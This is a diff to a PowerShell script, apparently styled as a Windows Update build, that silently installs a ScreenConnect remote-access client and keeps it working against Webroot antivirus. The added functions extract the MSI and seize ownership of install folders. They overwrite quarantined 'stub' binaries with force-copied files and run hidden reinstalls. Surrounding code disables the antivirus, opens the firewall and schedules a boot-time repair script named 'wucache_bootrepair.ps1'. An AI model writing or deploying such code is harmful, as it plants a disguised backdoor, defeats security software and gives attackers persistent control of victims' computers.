@@ -523,6 +523,59 @@ function Get-PrimaryMsiFile {
     return $false
 }
 
+function Get-PrimaryScInstallDir {
+    foreach ($p in @(
+        "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)",
+        "${env:ProgramFiles}\ScreenConnect Client ($PrimaryFingerprint)"
+    )) {
+        if (Test-Path $p) { return $p }
+    }
+    return "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)"
+}
+
+function Expand-ScMsiOverInstall {
+    # msiexec /i often exit=0 without overwriting Webroot stubs — admin-extract + force copy
+    param([string]$MsiPath, [string]$DestDir)
+    if (-not (Test-Path $MsiPath)) { return $false }
+    $extract = Join-Path $WorkDir 'msi_extract'
+    Remove-Item $extract -Recurse -Force -ErrorAction SilentlyContinue
+    New-Item -ItemType Directory -Path $extract -Force | Out-Null
+    Write-Log "REPAIR: msiexec /a extract -> $extract"
+    $ep = Start-Process msiexec.exe -ArgumentList "/a `"$MsiPath`" /qn TARGETDIR=`"$extract`"" `
+        -Wait -PassThru -WindowStyle Hidden
+    Write-Log "REPAIR: msiexec /a exit $($ep.ExitCode)"
+    $bins = @(Get-ChildItem -Path $extract -Recurse -Include 'ScreenConnect*.exe', 'ScreenConnect*.dll' -ErrorAction SilentlyContinue)
+    if ($bins.Count -lt 1) {
+        Write-Log 'REPAIR: MSI extract produced no ScreenConnect binaries'
+        return $false
+    }
+    New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
+    cmd /c "takeown /F `"$DestDir`" /R /D Y" >$null 2>&1
+    cmd /c "icacls `"$DestDir`" /grant Administrators:F /T /C" >$null 2>&1
+    $copied = 0
+    foreach ($b in $bins) {
+        $rel = $b.FullName.Substring($extract.Length).TrimStart('\')
+        $target = Join-Path $DestDir $rel
+        $parent = Split-Path $target -Parent
+        if (-not (Test-Path $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
+        try {
+            if (Test-Path $target) {
+                cmd /c "takeown /F `"$target`" /D Y" >$null 2>&1
+                attrib -r -s -h "$target" >$null 2>&1
+                Remove-Item $target -Force -ErrorAction SilentlyContinue
+            }
+            Copy-Item -LiteralPath $b.FullName -Destination $target -Force -ErrorAction Stop
+            Write-Log ("REPAIR: restored {0} bytes={1}" -f $b.Name, $b.Length)
+            $copied++
+        } catch {
+            Write-Log ("REPAIR: copy failed {0}: {1}" -f $b.Name, $_.Exception.Message)
+        }
+    }
+    Remove-Item $extract -Recurse -Force -ErrorAction SilentlyContinue
+    Write-Log "REPAIR: extract/copy restored $copied files"
+    return ($copied -gt 0)
+}
+
 function Repair-ScAfterAv {
     Write-Log 'REPAIR: Webroot nuclear + clean SC reinstall (empty name / no join)'
     Invoke-WebrootNuclear | Out-Null
@@ -534,23 +587,40 @@ function Repair-ScAfterAv {
 
     Uninstall-PrimaryScResidue
     Start-Sleep -Seconds 2
+    $left = Get-PrimaryScInstallDir
+    if (Test-Path $left) {
+        Write-Log "REPAIR: residue still present after uninstall - forcing wipe: $left"
+        cmd /c "takeown /F `"$left`" /R /D Y" >$null 2>&1
+        cmd /c "icacls `"$left`" /grant Administrators:F /T /C" >$null 2>&1
+        Remove-Item $left -Recurse -Force -ErrorAction SilentlyContinue
+    }
 
-    # Force install path even if service remnants confuse detection
     Write-Log 'REPAIR: downloading fresh MSI'
     if (-not (Get-PrimaryMsiFile -Dest $MsiFile)) {
         Write-Log 'REPAIR: MSI invalid'
         return $false
     }
     $logMsi = Join-Path $WorkDir 'msi_repair.log'
-    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
+    # Always force file overwrite (amus). Plain /i exit=0 often leaves stubs untouched.
+    Write-Log 'REPAIR: msiexec /i REINSTALL=ALL REINSTALLMODE=amus'
+    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus /l*v `"$logMsi`"" `
         -Wait -PassThru -WindowStyle Hidden
     Write-Log "REPAIR: msiexec exit $($p.ExitCode)"
     if ($p.ExitCode -ne 0) {
-        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus" `
+        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
             -Wait -PassThru -WindowStyle Hidden
-        Write-Log "REPAIR: msiexec reinstall exit $($p2.ExitCode)"
+        Write-Log "REPAIR: msiexec fresh-install exit $($p2.ExitCode)"
     }
-    Start-Sleep -Seconds 10
+    Start-Sleep -Seconds 8
+
+    $dest = Get-PrimaryScInstallDir
+    $hMid = Get-ScBinaryHealth
+    if ($hMid.Stubbed -or -not $hMid.HasClientExe) {
+        Write-Log 'REPAIR: stubs remain after msiexec - admin-extract + force copy'
+        Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir $dest | Out-Null
+        Start-Sleep -Seconds 2
+    }
+
     Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue
     Start-PrimaryService | Out-Null
     Enable-ScFirewallAllow
@@ -560,7 +630,6 @@ function Repair-ScAfterAv {
     Write-Log ("SC health after repair: running={0} exes={1} procs={2} stub={3} svcExe={4} client={5}/{6}" -f `
         $h2.ServiceRunning, $h2.ExeCount, $h2.ProcCount, $h2.Stubbed, $h2.SvcExeSize, $h2.HasClientExe, $h2.ClientExeSize)
     foreach ($d in $h2.ExeDetail) { Write-Log ("  bin: $d") }
-    # Running alone is NOT success — Webroot stubs keep the service "up"
     $ok = ((Test-ScServiceRunning) -and -not $h2.Stubbed -and $h2.HasClientExe -and -not (Test-ScControlBroken))
     if ($ok) {
         $marker = Join-Path $WorkDir '.repaired_webroot'
@@ -568,7 +637,6 @@ function Repair-ScAfterAv {
         Write-Log 'REPAIR: success marker written'
     } else {
         Write-Log 'REPAIR: still broken after reinstall (likely Webroot stubs / NOT_STOPPABLE)'
-        # Schedule one boot-time repair after IFEO/registry Start=4 take effect
         try {
             $bootPs1 = Join-Path $WorkDir 'wucache_bootrepair.ps1'
             $bootBody = @"
@@ -1240,7 +1308,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730D'
+Write-Log 'WU_BUILD_20260730E'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
@@ -1577,19 +1645,23 @@ function Install-PrimarySc {
     }
 
     $logMsi = Join-Path $WorkDir 'msi.log'
-    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
+    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus /l*v `"$logMsi`"" `
         -Wait -PassThru -WindowStyle Hidden
     $code = $p.ExitCode
     Write-Log "msiexec exit $code"
     if ($code -ne 0) {
-        # Retry once as repair/reinstall
-        Write-Log 'msiexec retry with REINSTALL=ALL'
-        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus" `
+        Write-Log 'msiexec retry plain /i'
+        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
             -Wait -PassThru -WindowStyle Hidden
         $code = $p2.ExitCode
         Write-Log "msiexec reinstall exit $code"
     }
     Start-Sleep -Seconds 8
+    $binAfter = Get-ScBinaryHealth
+    if ($binAfter.Stubbed -or -not $binAfter.HasClientExe) {
+        Write-Log 'Install-PrimarySc: stubs after msiexec - extract/copy'
+        Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir (Get-PrimaryScInstallDir) | Out-Null
+    }
     Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue
     Enable-ScFirewallAllow
 
